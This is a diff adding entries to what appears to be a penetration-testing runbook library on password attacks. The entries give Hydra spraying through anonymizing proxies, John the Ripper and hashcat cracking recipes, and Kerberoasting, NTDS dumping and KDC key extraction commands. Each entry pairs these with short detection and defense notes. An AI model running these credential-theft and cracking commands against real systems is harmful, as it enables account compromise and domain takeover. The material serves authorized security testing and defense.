+    "description": "<p>This runbook routes Hydra authentication testing through HTTP/SOCKS/CONNECT proxies for segmented network access, egress control, or relay-chain operational constraints.</p>\n<p>Proxy behavior is controlled with environment variables such as <span style=\"color:#ef4444;font-weight:bold;\">#HYDRA_PROXY_HTTP</span> and <span style=\"color:#ef4444;font-weight:bold;\">#HYDRA_PROXY</span>, supporting inline endpoints or proxy list files.</p>\n\n<ol>\n  <li><strong>Define proxy transport path:</strong> choose HTTP-only proxy path or generic transport proxy depending on target protocol.</li>\n  <li><strong>Run credential checks through proxy:</strong> execute Hydra modules while preserving original testing logic.</li>\n  <li><strong>Rotate or pool proxies:</strong> use list files for resilient routing and distributed campaigns.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#hydra</span> plus proxy environment variable support in official README/man docs.</li>\n  <li><strong>Attack pre-requisite:</strong> reachable proxy infrastructure and permitted authorized testing scope.</li>\n  <li><strong>What attacker gain:</strong> network reach to otherwise inaccessible targets and operational flexibility for credential testing.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor auth failures from atypical egress paths, enforce MFA, and detect proxy-origin abuse patterns.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>HYDRA_PROXY_HTTP=\"http://123.45.67.89:8080/\" hydra -L users.txt -P pass.txt http-get://target\nHYDRA_PROXY_HTTP=\"proxylist.txt\" hydra -L users.txt -P pass.txt http-post-form://target\nHYDRA_PROXY=connect://proxy.anonymizer.com:8000 hydra -L users.txt -P pass.txt ssh://target\nHYDRA_PROXY=socks4://auth:pw@127.0.0.1:1080 hydra -L users.txt -P pass.txt rdp://target</code></pre>",
+    "tags": [
+      "password-cracking",
+      "hydra",
+      "proxy-routing",
+      "online-auth",
+      "phase:credential-access"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "c3928595-6820-5327-8f8a-92fc233625a7",
+    "label": "Hydra Online Credential Attack Workflow",
+    "command": "hydra -l admin -p password ftp://target/\nhydra -L logins.txt -P passwords.txt ftp://target/\nhydra -L users.txt -P passwords.txt -e snr ssh://target/\nhydra -C default_accounts.txt ftp://target/\nhydra -l ftp -x 3:3:a ftp://target/\nhydra -U http-post-form\nhydra -l test -p test -m PLAIN imap://127.0.0.1/PLAIN\nhydra -M targets.txt -L users.txt -p 'Winter2025!' -u -t 4 ssh\nhydra -R",
+    "description": "<p>This runbook covers online authentication testing using <span style=\"color:#ef4444;font-weight:bold;\">#hydra</span> across single-host and multi-host services with support for dictionaries, username-password pairs, module options, brute charset generation, and session recovery.</p>\n<p>It is typically used in authorized assessments to validate weak credential exposure, lockout thresholds, and service-specific authentication hardening on protocols such as FTP, SSH, IMAP, HTTP forms, and RDP.</p>\n\n<ol>\n  <li><strong>Define target protocol and auth model:</strong> choose module and credential input mode (`-l/-p`, `-L/-P`, `-C`, `-x`).</li>\n  <li><strong>Control spray behavior:</strong> tune user/password ordering, parallelism, and module-specific arguments to minimize lockout impact.</li>\n  <li><strong>Persist and recover:</strong> export findings and resume interrupted sessions with restore support.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#hydra</span> (typically `/usr/bin/hydra` on Kali), module help via <span style=\"color:#ef4444;font-weight:bold;\">#hydra -U &lt;module&gt;</span>.</li>\n  <li><strong>Attack pre-requisite:</strong> reachable target service on relevant <span style=\"color:#3b82f6;font-weight:bold;\">TCP ports</span>, authorized test scope, and candidate credential sources.</li>\n  <li><strong>What attacker gain:</strong> valid credential pairs enabling authenticated access, lateral movement, or privilege escalation paths.</li>\n  <li><strong>Detection/Defense opsec:</strong> enforce MFA, lockout/rate-limits, geo/device anomaly checks, and SIEM alerts on repeated auth failures across services.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>hydra -l admin -p password ftp://target/\nhydra -L logins.txt -P passwords.txt ftp://target/\nhydra -L users.txt -P passwords.txt -e snr ssh://target/\nhydra -C default_accounts.txt ftp://target/\nhydra -l ftp -x 3:3:a ftp://target/\nhydra -U http-post-form\nhydra -l test -p test -m PLAIN imap://127.0.0.1/PLAIN\nhydra -M targets.txt -L users.txt -p 'Winter2025!' -u -t 4 ssh\nhydra -R</code></pre>",
+    "tags": [
+      "password-cracking",
+      "hydra",
+      "online-auth",
+      "password-spraying",
+      "phase:credential-access"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "92f739e1-82db-5e8e-a6fc-aba3d61f65a3",
+    "label": "Hydra Wordlist Hygiene and Filtering",
+    "command": "cat words.txt | sort | uniq > dictionary.txt\ncat dictionary.txt | pw-inspector -m 6 -c 2 -n > passlist.txt\nhydra -L users.txt -P passlist.txt -u -t 4 ssh://target",
+    "description": "<p>This runbook optimizes online spray quality by deduplicating dictionaries and applying policy-aware password filters before running Hydra. It reduces noise, improves hit ratio, and lowers lockout risk.</p>\n<p>The pre-processing pipeline uses shell sort/uniq plus <span style=\"color:#ef4444;font-weight:bold;\">#pw-inspector</span> constraints (minimum length/class requirements) before execution in <span style=\"color:#ef4444;font-weight:bold;\">#hydra</span>.</p>\n\n<ol>\n  <li><strong>Normalize candidate set:</strong> remove duplicate passwords from raw dictionaries.</li>\n  <li><strong>Apply policy filters:</strong> retain only candidates matching known organization policy constraints.</li>\n  <li><strong>Execute controlled spray:</strong> run Hydra with reduced, high-probability candidate list.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> shell utilities (`sort`, `uniq`), <span style=\"color:#ef4444;font-weight:bold;\">#pw-inspector</span>, and <span style=\"color:#ef4444;font-weight:bold;\">#hydra</span>.</li>\n  <li><strong>Attack pre-requisite:</strong> initial dictionary source and known/estimated target password policy characteristics.</li>\n  <li><strong>What attacker gain:</strong> improved online credential discovery efficiency with fewer wasted attempts.</li>\n  <li><strong>Detection/Defense opsec:</strong> enforce MFA and behavioral detection; policy-aware sprays are lower noise and may evade naive threshold-only monitoring.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>cat words.txt | sort | uniq &gt; dictionary.txt\ncat dictionary.txt | pw-inspector -m 6 -c 2 -n &gt; passlist.txt\nhydra -L users.txt -P passlist.txt -u -t 4 ssh://target</code></pre>",
+    "tags": [
+      "password-cracking",
+      "hydra",
+      "wordlist-hygiene",
+      "policy-filtering",
+      "phase:optimization"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "82092015-cb5e-56ae-a7d0-01b7595a031e",
+    "label": "JTR SSH Key Conversion Crack",
+    "command": "ssh2john.py id_rsa > ssh.hash\njohn ssh.hash",
+    "description": "<p>This runbook converts passphrase-protected SSH private keys into John-compatible hash format and executes offline cracking. It is a focused credential-recovery path for stolen or recovered SSH key files.</p>\n<p>The workflow is minimal: parse key material with <span style=\"color:#ef4444;font-weight:bold;\">#ssh2john.py</span>, then run <span style=\"color:#ef4444;font-weight:bold;\">#john</span> against the generated hash output.</p>\n\n<ol>\n  <li><strong>Extract crackable hash:</strong> transform private key metadata into JtR input format.</li>\n  <li><strong>Run offline candidate attack:</strong> apply default or explicit wordlist/rule cracking strategy.</li>\n  <li><strong>Validate recovered passphrase:</strong> test recovered secret against target SSH key usage path.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#ssh2john.py</span> (John jumbo tools) and <span style=\"color:#ef4444;font-weight:bold;\">#john</span>.</li>\n  <li><strong>Attack pre-requisite:</strong> access to encrypted private key file(s) and legal authorization for cracking attempt.</li>\n  <li><strong>What attacker gain:</strong> SSH key passphrase leading to direct private key operational use.</li>\n  <li><strong>Detection/Defense opsec:</strong> protect key files, enforce hardware-backed keys where possible, rotate compromised keys, and monitor anomalous SSH authentications on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 22</span>.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>ssh2john.py id_rsa &gt; ssh.hash\njohn ssh.hash</code></pre>",
+    "tags": [
+      "password-cracking",
+      "john-the-ripper",
+      "ssh",
+      "key-passphrase",
+      "phase:credential-access"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "eef52b47-ac1f-59c6-80cf-e0abecfb9abe",
+    "label": "John Candidate Dedupe Preprocessing",
+    "command": "john --wordlist=all.lst --rules --stdout | unique mangled.lst\njohn --wordlist=mangled.lst mypasswd\njohn --wordlist=all.lst --rules --stdout=8 | unique mangled8.lst\njohn --wordlist=mangled8.lst mypasswd",
+    "description": "<p>This runbook pre-generates John rule-expanded candidates and deduplicates them before cracking. It is useful when slow hash formats make duplicate candidate attempts expensive.</p>\n<p>By piping <span style=\"color:#ef4444;font-weight:bold;\">#john --stdout</span> into <span style=\"color:#ef4444;font-weight:bold;\">#unique</span>, operators trade disk usage for reduced redundant candidate processing.</p>\n\n<ol>\n  <li><strong>Generate mutated candidates:</strong> use John rules to expand base dictionaries.</li>\n  <li><strong>Deduplicate stream:</strong> remove repeated candidates while preserving order.</li>\n  <li><strong>Replay optimized list:</strong> run cracking against deduped candidate files.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#john</span> and companion utility <span style=\"color:#ef4444;font-weight:bold;\">#unique</span> in JtR runtime/toolset.</li>\n  <li><strong>Attack pre-requisite:</strong> hash file, baseline wordlist, and selected ruleset.</li>\n  <li><strong>What attacker gain:</strong> lower redundant processing overhead and better performance consistency on slow hash targets.</li>\n  <li><strong>Detection/Defense opsec:</strong> random, non-reused passphrases reduce the value of precomputed mutation campaigns.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>john --wordlist=all.lst --rules --stdout | unique mangled.lst\njohn --wordlist=mangled.lst mypasswd\njohn --wordlist=all.lst --rules --stdout=8 | unique mangled8.lst\njohn --wordlist=mangled8.lst mypasswd</code></pre>",
+    "tags": [
+      "password-cracking",
+      "john-the-ripper",
+      "preprocessing",
+      "deduplication",
+      "phase:optimization"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "b7aaac93-7481-5b3c-9a65-96d6d580f017",
+    "label": "John Incremental Charset Engineering",
+    "command": "john -inc=digits mypasswd\njohn --make-charset=custom.chr mypasswd\njohn --make-charset=custom.chr passwd1 passwd2\njohn -inc=custom passwd3\njohn --make-charset=my_alpha.chr --external=filter_alpha mypasswd",
+    "description": "<p>This runbook builds custom charset profiles from recovered plaintexts and runs incremental attacks tuned to target-specific character distributions. It is designed for deep cracking phases after initial dictionary/rule passes.</p>\n<p>It combines <span style=\"color:#ef4444;font-weight:bold;\">#--make-charset</span> with <span style=\"color:#ef4444;font-weight:bold;\">#--incremental</span> modes (including <span style=\"color:#ef4444;font-weight:bold;\">#digits</span>) to optimize candidate ordering.</p>\n\n<ol>\n  <li><strong>Generate charset model:</strong> derive character frequency profiles from cracked sets or selected files.</li>\n  <li><strong>Run targeted incremental modes:</strong> start with low-entropy modes such as digits, then custom charsets.</li>\n  <li><strong>Iterate from new cracks:</strong> refresh charset model as new plaintexts are recovered.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#john</span> charset generation and incremental mode features.</li>\n  <li><strong>Attack pre-requisite:</strong> seed plaintext corpus (potfile or cracked files), target hash set, and runtime tolerance for incremental search.</li>\n  <li><strong>What attacker gain:</strong> better candidate ordering and increased late-phase crack success compared to generic brute-force.</li>\n  <li><strong>Detection/Defense opsec:</strong> long unique passphrases resist incremental modeling; credential rotation disrupts iterative attacker feedback.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>john -inc=digits mypasswd\njohn --make-charset=custom.chr mypasswd\njohn --make-charset=custom.chr passwd1 passwd2\njohn -inc=custom passwd3\njohn --make-charset=my_alpha.chr --external=filter_alpha mypasswd</code></pre>",
+    "tags": [
+      "password-cracking",
+      "john-the-ripper",
+      "incremental",
+      "charset",
+      "phase:deep-crack"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "a94e0976-9b8f-5d2e-826a-664d510847aa",
+    "label": "John JSON Format Triage Mapping",
+    "command": "john --show=formats hashes.txt\njohn --show=formats hashes.txt | json_pp\njohn --show=formats hashes.txt | python -c 'import json, sys, pprint; pprint.pprint(json.load(sys.stdin))'\njohn --format=raw-md5 hashes.txt --show=formats",
+    "description": "<p>This runbook uses John `--show=formats` JSON output to classify mixed hash files, validate parser compatibility, and understand canonical hash transformations used in pot matching.</p>\n<p>It supports machine parsing and pretty-print workflows using <span style=\"color:#ef4444;font-weight:bold;\">#json_pp</span> or Python, making it useful for automated intake pipelines and format troubleshooting.</p>\n\n<ol>\n  <li><strong>Parse input hashes as JSON metadata:</strong> inspect line-by-line format possibilities.</li>\n  <li><strong>Constrain and validate format assumptions:</strong> scope checks with explicit format filters.</li>\n  <li><strong>Map canonical representation:</strong> align source hashes with potfile canonical forms for reliable match logic.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#john --show=formats</span>, plus optional <span style=\"color:#ef4444;font-weight:bold;\">#json_pp</span> and Python JSON tooling.</li>\n  <li><strong>Attack pre-requisite:</strong> hash file(s) requiring format disambiguation or parser validation.</li>\n  <li><strong>What attacker gain:</strong> fewer parser mismatches, cleaner automation, and reliable canonical hash handling.</li>\n  <li><strong>Detection/Defense opsec:</strong> no direct exploit vector here; this stage improves attacker workflow quality once hash data is already exposed.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>john --show=formats hashes.txt\njohn --show=formats hashes.txt | json_pp\njohn --show=formats hashes.txt | python -c 'import json, sys, pprint; pprint.pprint(json.load(sys.stdin))'\njohn --format=raw-md5 hashes.txt --show=formats</code></pre>",
+    "tags": [
+      "password-cracking",
+      "john-the-ripper",
+      "format-triage",
+      "json",
+      "phase:triage"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "27842023-532d-501d-b7af-e618b7272216",
+    "label": "John Mask and Incremental Hybrid",
+    "command": "john --mask='?a' --min-length=1 --max-length=8 hashes.txt\njohn --wordlist=word.lst --rules=jumbo --mask='?w?d?d?d' hashes.txt\njohn --incremental=digits --mask='?w?d?d?d' hashes.txt",
+    "description": "<p>This runbook chains John mask attacks with incremental generators and wordlist hybrids for controlled candidate expansion. It is effective when password shape is partially known and full brute-force is too expensive.</p>\n<p>It combines <span style=\"color:#ef4444;font-weight:bold;\">#john --mask</span> with <span style=\"color:#ef4444;font-weight:bold;\">#--incremental=digits</span> and optional wordlist/rule pre-seeding to cover structured candidate space in priority order.</p>\n\n<ol>\n  <li><strong>Define structural mask:</strong> encode known shape assumptions into JtR mask tokens.</li>\n  <li><strong>Apply hybrid with seeded words:</strong> combine root words and digit tails where applicable.</li>\n  <li><strong>Expand with incremental digits mode:</strong> let John fill unknown ranges under controlled complexity.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#john</span> jumbo build/runtime with mask support.</li>\n  <li><strong>Attack pre-requisite:</strong> target hash file, known/assumed password pattern, and optional wordlist for hybrid seeding.</li>\n  <li><strong>What attacker gain:</strong> improved coverage for patterned passwords without paying full random keyspace cost.</li>\n  <li><strong>Detection/Defense opsec:</strong> require long passphrases and block simplistic pattern constructions (word+digits); rotate credentials on compromise indicators.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>john --mask='?a' --min-length=1 --max-length=8 hashes.txt\njohn --wordlist=word.lst --rules=jumbo --mask='?w?d?d?d' hashes.txt\njohn --incremental=digits --mask='?w?d?d?d' hashes.txt</code></pre>",
+    "tags": [
+      "password-cracking",
+      "john-the-ripper",
+      "mask-attack",
+      "incremental",
+      "phase:offline-crack"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "f26ef322-928d-5848-bcac-55ff4d9351f7",
+    "label": "John Rules and Loopback Workflow",
+    "command": "john --wordlist=words.txt --rules hashes.txt\njohn --wordlist=words.txt --rules --stdout > w_mutated.txt\njohn --wordlist=words.txt --rules=all --stdout > w_mutated_all.txt\njohn --loopback --rules hashes.txt\njohn --loopback --rules=none hashes.txt\njohn --session=corp_jtr --wordlist=words.txt --rules hashes.txt\njohn --status=corp_jtr\njohn --restore=corp_jtr",
+    "description": "<p>This runbook uses John the Ripper for rule-driven candidate generation, loopback reuse of recovered passwords, and resumable session control. It is effective when iterative mutation campaigns are needed across large hash sets.</p>\n<p>Core operations include <span style=\"color:#ef4444;font-weight:bold;\">#john --wordlist --rules</span>, candidate preview through <span style=\"color:#ef4444;font-weight:bold;\">#--stdout</span>, and potfile recycling with <span style=\"color:#ef4444;font-weight:bold;\">#--loopback</span>.</p>\n\n<ol>\n  <li><strong>Run rule-mutated wordlist attack:</strong> apply selected rulesets to generate high-probability variants.</li>\n  <li><strong>Preview and tune candidates:</strong> inspect generated candidates in stdout mode before expensive runs.</li>\n  <li><strong>Recycle known plaintexts:</strong> use loopback to mutate already-cracked passwords and discover adjacent credentials.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#john</span> (`/usr/sbin/john` or local jumbo build path), potfile and session files from standard John runtime.</li>\n  <li><strong>Attack pre-requisite:</strong> valid hash file, wordlist, and chosen ruleset; optional existing potfile data for loopback mode.</li>\n  <li><strong>What attacker gain:</strong> expanded crack coverage via adaptive mutation and cross-account password reuse discovery.</li>\n  <li><strong>Detection/Defense opsec:</strong> eliminate password reuse across accounts, enforce MFA, and apply high-entropy policies to reduce loopback mutation success.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>john --wordlist=words.txt --rules hashes.txt\njohn --wordlist=words.txt --rules --stdout &gt; w_mutated.txt\njohn --wordlist=words.txt --rules=all --stdout &gt; w_mutated_all.txt\njohn --loopback --rules hashes.txt\njohn --loopback --rules=none hashes.txt\njohn --session=corp_jtr --wordlist=words.txt --rules hashes.txt\njohn --status=corp_jtr\njohn --restore=corp_jtr</code></pre>",
+    "tags": [
+      "password-cracking",
+      "john-the-ripper",
+      "rules-engine",
+      "loopback",
+      "phase:offline-crack"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "895a8a69-d0ef-5e0a-b242-1305c7741b6e",
+    "label": "John Shell User Salt Scope Reduction",
+    "command": "john --wordlist=all.lst --rules --shells=sh,csh,tcsh,bash mypasswd\njohn --wordlist=all.lst --rules --users=0 *passwd*\njohn --wordlist=all.lst --rules --users=-root,solar *passwd*\njohn --wordlist=all.lst --rules --salts=2 *passwd*\njohn --wordlist=all.lst --rules --salts=-2 *passwd*",
+    "description": "<p>This runbook narrows cracking scope in John by filtering target accounts by shell, user, and salt population. It is used to prioritize high-value and high-likelihood crack targets first.</p>\n<p>Using <span style=\"color:#ef4444;font-weight:bold;\">#--shells</span>, <span style=\"color:#ef4444;font-weight:bold;\">#--users</span>, and <span style=\"color:#ef4444;font-weight:bold;\">#--salts</span> improves early crack yield and reduces unnecessary compute on lower-priority segments.</p>\n\n<ol>\n  <li><strong>Prioritize accounts:</strong> isolate user cohorts (privileged, service, non-local) for focused cracking.</li>\n  <li><strong>Exploit salt distribution:</strong> crack high-population salts first to maximize early return.</li>\n  <li><strong>Backfill remaining scope:</strong> run inverse salt/user filters for full coverage.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#john</span> account/salt filter options in standard JtR builds.</li>\n  <li><strong>Attack pre-requisite:</strong> hash input that includes account metadata suitable for shell/user filtering.</li>\n  <li><strong>What attacker gain:</strong> faster initial credential recovery and better campaign sequencing.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor privileged account authentication exposure and enforce stronger controls for high-value identities.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>john --wordlist=all.lst --rules --shells=sh,csh,tcsh,bash mypasswd\njohn --wordlist=all.lst --rules --users=0 *passwd*\njohn --wordlist=all.lst --rules --users=-root,solar *passwd*\njohn --wordlist=all.lst --rules --salts=2 *passwd*\njohn --wordlist=all.lst --rules --salts=-2 *passwd*</code></pre>",
+    "tags": [
+      "password-cracking",
+      "john-the-ripper",
+      "scope-reduction",
+      "salts",
+      "phase:optimization"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "340c7d8f-f040-565f-95e4-b92e57120584",
+    "label": "Kerberoast and Credential Material Pipeline",
+    "command": "GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast\nGetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>\ntargetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'\njohn --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast\nhashcat -m 13100 -a 0 hashes.rc4 wordlist.txt\nhashcat -m 19600 -a 0 hashes.aes128 wordlist.txt\nhashcat -m 19700 -a 0 hashes.aes256 wordlist.txt\nhashcat -m 7500 kerberos-asreq.txt wordlist.txt\nhashcat -m 5600 smb-ntlmv2.txt wordlist.txt\nsecretsdump.py -just-dc -outputfile dc_dump <DOMAIN>/<USER>:<PASS>@<DC_IP>\nhashcat -m 1000 dc_dump.ntds /usr/share/wordlists/rockyou.txt",
+    "description": "<p>This runbook is a broad credential-material acquisition chain spanning SPN ticket extraction, targeted Kerberoast variants, captured challenge-response artifacts, and domain dump cracking workflows.</p>\n<p>It combines tooling such as <span style=\"color:#ef4444;font-weight:bold;\">#GetUserSPNs.py</span>, <span style=\"color:#ef4444;font-weight:bold;\">#Rubeus</span>, <span style=\"color:#ef4444;font-weight:bold;\">#targetedKerberoast.py</span>, <span style=\"color:#ef4444;font-weight:bold;\">#Responder</span>, and <span style=\"color:#ef4444;font-weight:bold;\">#secretsdump.py</span> with format-specific cracking modes in <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span> and <span style=\"color:#ef4444;font-weight:bold;\">#john</span>.</p>\n\n<ol>\n  <li><strong>Collect Kerberos/service material:</strong> request TGS tickets (standard or targeted) and gather AS-REQ/NetNTLM captures where available.</li>\n  <li><strong>Acquire domain hash stores:</strong> dump NTDS-derived hashes through privileged AD extraction paths.</li>\n  <li><strong>Crack by format family:</strong> route each artifact type to matching hashcat/JtR mode for efficient offline recovery.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> Impacket examples (<span style=\"color:#ef4444;font-weight:bold;\">#GetUserSPNs.py</span>, <span style=\"color:#ef4444;font-weight:bold;\">#secretsdump.py</span>), <span style=\"color:#ef4444;font-weight:bold;\">#Rubeus</span>, <span style=\"color:#ef4444;font-weight:bold;\">#Responder</span>, <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span>, <span style=\"color:#ef4444;font-weight:bold;\">#john</span>.</li>\n  <li><strong>Attack pre-requisite:</strong> AD reachability and sufficient privileges/positioning for ticket requests, capture infrastructure, or directory replication extraction over <span style=\"color:#3b82f6;font-weight:bold;\">TCP 88/445/389</span>.</li>\n  <li><strong>What attacker gain:</strong> crackable Kerberos/NTLM material leading to service account compromise, privilege escalation, and potential domain dominance.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor anomalous TGS requests, disable weak service account passwords, enforce gMSA where possible, enable SMB signing, and detect DCSync/replication abuse.</li>\n</ul>\n\n<p><strong>Core Commands (subset):</strong></p>\n<pre><code>GetUserSPNs.py -request -dc-ip &lt;DC_IP&gt; &lt;DOMAIN&gt;/&lt;USER&gt; -outputfile hashes.kerberoast\nGetUserSPNs.py -request-user &lt;samAccountName&gt; -dc-ip &lt;DC_IP&gt; &lt;DOMAIN&gt;/&lt;USER&gt;\ntargetedKerberoast.py -d '&lt;DOMAIN&gt;' -u &lt;WRITER_SAM&gt; -p '&lt;WRITER_PASS&gt;'\njohn --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast\nhashcat -m 13100 -a 0 hashes.rc4 wordlist.txt\nhashcat -m 19600 -a 0 hashes.aes128 wordlist.txt\nhashcat -m 19700 -a 0 hashes.aes256 wordlist.txt\nhashcat -m 7500 kerberos-asreq.txt wordlist.txt\nhashcat -m 5600 smb-ntlmv2.txt wordlist.txt\nsecretsdump.py -just-dc -outputfile dc_dump &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;DC_IP&gt;\nhashcat -m 1000 dc_dump.ntds /usr/share/wordlists/rockyou.txt</code></pre>",
+    "tags": [
+      "password-cracking",
+      "active-directory",
+      "kerberoast",
+      "credential-dumping",
+      "phase:credential-access"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "cd1dac66-d8f4-523b-8438-1e6b57749884",
+    "label": "Kerberos KDC Dump Decryption Audit",
+    "command": "sudo kdb5_util dump -b7 kdc.dump\ncp /etc/krb5kdc/stash stash\nhprop --database=kdc.dump --master-key=stash --source=mit-dump --decrypt --stdout | hpropd -n --print | grep -oP \"23:\\\\K(.+?)(?=:)\" > rc4.hex\ntr '[:upper:]' '[:lower:]' < rc4.hex > hash\njohn --format=krb5-23 hash\nOMP_NUM_THREADS=4 john --format=krb5-23 --test\njohn --format=nt hash",
+    "description": "<p>This runbook audits Kerberos database hashes by dumping encrypted KDC data, decrypting it with master key material, extracting target etypes, and cracking offline with John formats.</p>\n<p>It bridges MIT/Heimdal toolchains (<span style=\"color:#ef4444;font-weight:bold;\">#kdb5_util</span>, <span style=\"color:#ef4444;font-weight:bold;\">#hprop</span>, <span style=\"color:#ef4444;font-weight:bold;\">#hpropd</span>) into cracking workflows using <span style=\"color:#ef4444;font-weight:bold;\">#john --format=krb5-23</span> or modern <span style=\"color:#ef4444;font-weight:bold;\">#--format=nt</span>.</p>\n\n<ol>\n  <li><strong>Dump encrypted KDC records:</strong> export Kerberos DB plus stash key material.</li>\n  <li><strong>Decrypt and extract etype hashes:</strong> parse usable crack material from decrypted output stream.</li>\n  <li><strong>Crack and benchmark formats:</strong> test cracking speed and recover plaintexts for audit findings.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> Kerberos admin utilities (<span style=\"color:#ef4444;font-weight:bold;\">#kdb5_util</span>, <span style=\"color:#ef4444;font-weight:bold;\">#hprop</span>) and <span style=\"color:#ef4444;font-weight:bold;\">#john</span>.</li>\n  <li><strong>Attack pre-requisite:</strong> privileged access to KDC host/filesystem (`kdc.dump`, `stash`) and authorized audit scope.</li>\n  <li><strong>What attacker gain:</strong> crackable Kerberos credential material from central identity store.</li>\n  <li><strong>Detection/Defense opsec:</strong> strict KDC host hardening, privileged access monitoring, and rapid credential reset for cracked principals.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>sudo kdb5_util dump -b7 kdc.dump\ncp /etc/krb5kdc/stash stash\nhprop --database=kdc.dump --master-key=stash --source=mit-dump --decrypt --stdout | hpropd -n --print | grep -oP \"23:\\\\K(.+?)(?=:)\" &gt; rc4.hex\ntr '[:upper:]' '[:lower:]' &lt; rc4.hex &gt; hash\njohn --format=krb5-23 hash\nOMP_NUM_THREADS=4 john --format=krb5-23 --test\njohn --format=nt hash</code></pre>",
+    "tags": [
+      "password-cracking",
+      "kerberos",
+      "john-the-ripper",
+      "kdc-audit",
+      "phase:credential-access"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "fcaa1887-e6a3-54a4-8fbf-162d8cf309f4",
+    "label": "MD5 Suffix Micro Bruteforce Search",
+    "command": "python3 - <<'PY'\nimport hashlib\ntarget = '2f2e2e'\ncandidate = 0\nwhile True:\n    plaintext = str(candidate)\n    h = hashlib.md5(plaintext.encode('ascii')).hexdigest()\n    if h[-len(target):] == target:\n        print(f'plaintext:\"{plaintext}\", md5:{h}')\n        break\n    candidate += 1\nPY",
+    "description": "<p>This runbook brute-forces numeric plaintext candidates until an MD5 hash ends with a specified suffix. It is a constrained search pattern for edge-case hash challenges and niche validation tasks.</p>\n<p>The approach iterates integers, computes MD5, and checks suffix match condition against target trailing hex bytes.</p>\n\n<ol>\n  <li><strong>Define target suffix:</strong> set expected trailing hash fragment.</li>\n  <li><strong>Iterate candidate space:</strong> compute MD5 for sequential candidate values.</li>\n  <li><strong>Stop on first match:</strong> return plaintext and full hash once suffix condition is satisfied.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> Python standard library <span style=\"color:#ef4444;font-weight:bold;\">#hashlib</span>.</li>\n  <li><strong>Attack pre-requisite:</strong> known suffix target and practical candidate domain constraints.</li>\n  <li><strong>What attacker gain:</strong> candidate plaintext that satisfies hash suffix condition for the tested domain.</li>\n  <li><strong>Detection/Defense opsec:</strong> use modern password hashing (Argon2/bcrypt/scrypt) and avoid weak MD5 usage in security logic.</li>\n</ul>\n\n<p><strong>Core Command:</strong></p>\n<pre><code>python3 - &lt;&lt;'PY'\nimport hashlib\ntarget = '2f2e2e'\ncandidate = 0\nwhile True:\n    plaintext = str(candidate)\n    h = hashlib.md5(plaintext.encode('ascii')).hexdigest()\n    if h[-len(target):] == target:\n        print(f'plaintext:\"{plaintext}\", md5:{h}')\n        break\n    candidate += 1\nPY</code></pre>",
+    "tags": [
+      "password-cracking",
+      "md5",
+      "brute-force",
+      "python",
+      "phase:special-case"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "a4b334b4-9b00-58bb-8131-5c5459c8d2b9",
+    "label": "PACK Cross Dataset Coverage Validation",
+    "command": "python statsgen.py ../PACK-0.0.3/archive/gawker.dic -o gawker.masks\npython maskgen.py gawker.masks --checkmasksfile rockyou.hcmask -q\npython maskgen.py gawker.masks --checkmasks=\"?u?l?l?l?l?l?d,?l?l?l?l?l?d?d\" -q",
